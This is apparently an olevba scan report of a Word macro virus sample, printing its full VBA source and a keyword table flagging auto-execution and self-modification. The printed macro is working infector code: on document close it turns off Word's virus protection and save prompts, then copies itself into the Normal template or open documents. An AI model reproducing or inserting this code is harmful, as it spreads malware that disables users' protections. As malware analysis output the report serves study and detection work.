olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.CPCK-based-53cf47606ecfafd3397b3930fa6167069e89767b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.CPCK-based-53cf47606ecfafd3397b3930fa6167069e89767b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'TT00022957.DOC
On Error Resume Next
'TT00022957.DOC
MC58 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'TT00022957.DOC
Options.SaveNormalPrompt = 0
'TT00022957.DOC
HI75 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'TT00022957.DOC
Options.VirusProtection = 0
'TT00022957.DOC
Application.EnableCancelKey = 0
'TT00022957.DOC
Options.ConfirmConversions = 0
'TT00022957.DOC
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
'TT00022957.DOC
Set UB83 = ActiveDocument.VBProject.VBComponents.Item(1)
'TT00022957.DOC
GB15 = True
'TT00022957.DOC
End If
'TT00022957.DOC
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
'TT00022957.DOC
Set UB83 = NormalTemplate.VBProject.VBComponents.Item(1)
'TT00022957.DOC
RM88 = True
'TT00022957.DOC
End If
'TT00022957.DOC
If RM88 <> True And GB15 <> True Then GoTo PU92
'TT00022957.DOC
If RM88 = True Then UB83.CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, HI75 - 1))
'TT00022957.DOC
If GB15 = True Then UB83.CodeModule.AddFromString ("Sub Document_Close()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, MC58 - 1))
'TT00022957.DOC
With UB83.CodeModule
'TT00022957.DOC
For x = 2 To (UB83.CodeModule.CountOfLines - 1) Step 2
'TT00022957.DOC
.replaceline x, "'" & Application.UserInitials & Application.UserInitials & Application.ActiveWindow
'TT00022957.DOC
Next x
'TT00022957.DOC
End With
'TT00022957.DOC
PU92:
'TT00022957.DOC
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

